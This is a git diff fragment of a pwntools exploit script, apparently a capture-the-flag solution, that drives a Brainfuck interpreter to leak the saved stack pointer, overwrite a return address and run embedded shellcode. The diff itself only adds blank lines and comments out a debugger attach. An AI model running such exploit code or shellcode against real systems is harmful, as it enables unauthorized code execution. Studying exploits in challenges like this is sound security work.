@@ -5,6 +5,7 @@ shell_code = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\
 
 rbp_offset = 0x1010
 ret_offset = 0x1010 + 0x8
+
 ''' brainfuck ~ mind blown :v
 data[dataPointer]
 
@@ -13,6 +14,7 @@ data[dataPointer]
  ,  data[dataPointer] = getc(stdin)
     ...
 '''
+
 payload = b''
 payload += b'>' * rbp_offset  # move pointer to rbp_cache
 payload += b'.>' * 8  # read rbp
@@ -27,9 +29,11 @@ io.send(payload)
 
 stack_addr = u64(io.read(8))
 print(f"leaked rbp: {hex(stack_addr)}")
-gdb.attach(io, gdbscript='''
-init-pwndbg
-''')
+
+# gdb.attach(io, gdbscript='''
+# init-pwndbg
+# ''')
+
 # runProgram has 0 parameters, so we go back 16 bytes (address and rbp of main)
 ret_addr = stack_addr - 0x10
 io.send(p64(ret_addr))
